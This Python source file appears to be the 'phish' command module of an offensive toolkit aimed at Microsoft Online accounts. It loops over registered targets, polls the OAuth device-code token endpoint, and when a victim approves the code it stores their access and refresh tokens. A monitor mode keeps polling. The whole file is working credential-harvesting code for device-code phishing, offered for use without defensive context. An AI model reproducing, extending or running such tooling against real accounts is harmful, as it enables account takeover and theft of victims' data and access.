from asyncio import gather
from datetime import datetime
import time

from .... import settings, wsp
from ....models import Wsp, WspTarget, Target
from ....app import current_app, Command
from ....clients import ms_online as client
from . import msgs

phish = Command('phish', __name__, validators=[])

@phish.assembly
def assemble_parser(subparsers):
    parser = subparsers.add_parser('phish',
        help="Fetches the OAuth tokens via oauth2 using device_code.")
    parser.add_argument('-a', '-all',
        help="Fetches tokens for all targets registered with WorkSpace.",
        action="store_true",
        dest="all_targets")
    parser.add_argument('-v', '--verbose',
        help="Displays output from the API.",
        action="store_true",
        dest="verbose")
    parser.add_argument('-m', '--monitor',
        help="Fetch the OAuth tokens incrementally making API calls in monitor mode, this is preferred",
        action='store_true',
        dest="monitor")
    return parser

@phish.func
def main():
    client.client.aio = True
    wsp_record = Wsp.select().first()
    targets_expired_count = 0
    targets_authed_count = 0
    current_app.display(msgs.starting_session())
    if settings.all_targets:
        targets = [target for target in Target.select()]
        current_app.display(msgs.checking_for_all_targets(targets))
    else:
        targets = [target for target in Target.select()\
            .join(WspTarget)\
                .where(WspTarget.active == True)]
        current_app.display(msgs.checking_for_active_target(targets[0]))
    updated_targets = []
    for target in targets:
        if not target.is_exp('refresh_token'):
            current_app.display(msgs.has_refresh_token(target))
            continue
        if target.is_exp('device_code'):
            current_app.display(msgs.user_code_expired(target))
            continue
        updated_targets.append(target)
    targets = updated_targets
    try:
        current_app.display(msgs.starting_check())
        while True: 
            if not targets:
                current_app.display(msgs.no_targets_need_phishing())
                raise KeyboardInterrupt
            target_devc_mapping = {target.device_code: target for target in targets}
            cors = [client.get_access_token(wsp_record.client_id, device_code = target.device_code,
                    raise_on_status_code=False) for target in targets]
            responses = client.client.loop.run_until_complete(gather(*cors))
            for r in responses:
                target = target_devc_mapping[r.resource.func_kwargs['device_code']]
                if settings.verbose:
                    current_app.display(r.json)
                if r.json.get('error') == 'authorization_pending':
                    pass
                if r.json.get('error') == 'expired_token':
                    targets_expired_count += 1
                    targets = [_target for _target in targets if _target.name != target.name]
                    current_app.display(msgs.user_code_expired(target))
                if r.status == 200:
                    targets_authed_count += 1
                    target.access_token = r.json['access_token']
                    target.refresh_token = r.json['refresh_token']
                    target.access_token_ts = datetime.now()
                    target.refresh_token_ts = datetime.now()
                    target.save()
                    targets = [_target for _target in targets if _target.name != target.name]
                    current_app.display(msgs.target_authed(target))
            if settings.monitor:
                time.sleep(1)
            else:
                raise KeyboardInterrupt
    except KeyboardInterrupt:
        current_app.display(msgs.ending_session(targets_authed_count, targets_expired_count))
            
        
                
                
     

